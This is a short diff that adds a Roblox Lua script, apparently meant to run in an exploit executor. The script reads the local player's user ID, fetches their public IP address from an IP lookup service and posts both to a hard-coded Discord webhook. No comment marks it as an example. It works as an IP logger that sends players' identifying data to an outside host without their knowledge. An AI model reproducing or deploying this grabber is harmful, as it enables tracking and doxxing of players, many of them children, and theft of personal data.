@@ -1,0 +1,11 @@
+local id = game.Players.LocalPlayer.UserId
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+local embed = game:GetService("HttpService"):JSONEncode({
+['content']=  id  ..  ip
+})
+syn.request({
+Url = "https://discord.com/api/webhooks/888976430002741269/E21AM62dHI7yduCLJJM4LQXwtqk21grPd-oOoGIsAnq9gqhu01iOrz3PXwKa_4DhuyQj",
+Method = "POST",
+Headers = {["Content-Type"] = "application/json"},
+Body = embed,
+})
